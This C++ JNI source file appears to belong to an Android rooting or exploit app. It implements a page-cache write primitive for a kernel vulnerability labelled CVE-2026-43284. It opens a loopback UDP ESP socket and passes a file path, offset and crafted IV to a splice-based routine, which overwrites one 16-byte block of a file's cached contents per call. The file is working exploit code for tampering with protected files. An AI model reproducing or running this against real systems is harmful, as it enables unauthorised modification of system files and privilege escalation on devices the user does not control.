/** @file boundary/jni/native_raw_esp.cpp
 *  Minimal direct ESP page-cache writer: one CBC block per call.
 *
 *  Kotlin owns the plan, the old-content read, the IV (AES-ECB-dec(old) XOR desired),
 *  the block loop and verification. This file only performs the syscall sequence that
 *  DFRoot uses (vmsplice header + splice file page + splice pipe to UDP socket).
 */
#include <jni.h>

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <new>

#include "backend/cve_2026_43284/lib/raw_esp.hpp"

namespace {
    thread_local char g_last_error[160] = {0};

    void set_error(const char *stage) noexcept {
        std::snprintf(g_last_error, sizeof(g_last_error), "%s errno=%d", stage, errno);
    }

    struct RawEsp final {
        int sock = -1;
        std::uint32_t spi = 0U;
        std::uint32_t sequence = 0U;
    };

    RawEsp *from_handle(jlong handle) noexcept {
        return reinterpret_cast<RawEsp *>(static_cast<std::intptr_t>(handle));
    }

    void close_handle(RawEsp *state) noexcept {
        if (state == nullptr) {
            return;
        }
        if (state->sock >= 0) {
            ::close(state->sock);
        }
        delete state;
    }
}  // namespace

extern "C" JNIEXPORT jlong JNICALL
Java_com_ghostlock_app_jni_cve43284_NativeRawEsp_open(
        JNIEnv *, jclass, jint spi, jint encap_port, jint sender_port) {
    auto *state = new (std::nothrow) RawEsp();
    if (state == nullptr) {
        return 0;
    }
    state->spi = static_cast<std::uint32_t>(spi);
    state->sock = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (state->sock < 0) {
        close_handle(state);
        return 0;
    }
    const int enable = 1;
    static_cast<void>(::setsockopt(state->sock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)));
    sockaddr_in source{};
    source.sin_family = AF_INET;
    source.sin_port = htons(static_cast<std::uint16_t>(sender_port));
    source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (::bind(state->sock, reinterpret_cast<sockaddr *>(&source), sizeof(source)) < 0) {
        close_handle(state);
        return 0;
    }
    sockaddr_in destination{};
    destination.sin_family = AF_INET;
    destination.sin_port = htons(static_cast<std::uint16_t>(encap_port));
    destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (::connect(state->sock, reinterpret_cast<sockaddr *>(&destination), sizeof(destination)) < 0) {
        close_handle(state);
        return 0;
    }
    return static_cast<jlong>(reinterpret_cast<std::intptr_t>(state));
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_ghostlock_app_jni_cve43284_NativeRawEsp_writeBlock(
        JNIEnv *env, jclass, jlong handle, jstring path, jlong offset, jbyteArray iv, jint sequence) {
    RawEsp *state = from_handle(handle);
    if (state == nullptr || env == nullptr || path == nullptr || iv == nullptr) {
        set_error("raw-invalid-args");
        return JNI_FALSE;
    }
    if (env->GetArrayLength(iv) != 16) {
        set_error("raw-iv-size");
        return JNI_FALSE;
    }
    const char *name = env->GetStringUTFChars(path, nullptr);
    if (name == nullptr) {
        set_error("raw-path-chars");
        return JNI_FALSE;
    }
    std::uint8_t iv_bytes[16] = {};
    env->GetByteArrayRegion(iv, 0, 16, reinterpret_cast<jbyte *>(iv_bytes));

    const ghostlock::backend::cve_2026_43284::lib::RawEspEndpoint endpoint{state->sock, state->spi};
    const ghostlock::backend::cve_2026_43284::lib::RawEspWrite request{
        name, static_cast<off_t>(offset), iv_bytes, static_cast<std::uint32_t>(sequence),
    };
    ghostlock::backend::cve_2026_43284::lib::RawEspError error{};
    const bool ok = ghostlock::backend::cve_2026_43284::lib::esp_write_block(endpoint, request, &error);
    env->ReleaseStringUTFChars(path, name);
    if (!ok) {
        std::snprintf(g_last_error, sizeof(g_last_error), "%s errno=%d",
                      error.stage != nullptr ? error.stage : "raw-write", error.err);
    }
    return ok ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_ghostlock_app_jni_cve43284_NativeRawEsp_lastError(JNIEnv *env, jclass) {
    return env->NewStringUTF(g_last_error);
}

extern "C" JNIEXPORT void JNICALL
Java_com_ghostlock_app_jni_cve43284_NativeRawEsp_close(JNIEnv *, jclass, jlong handle) {
    close_handle(from_handle(handle));
}
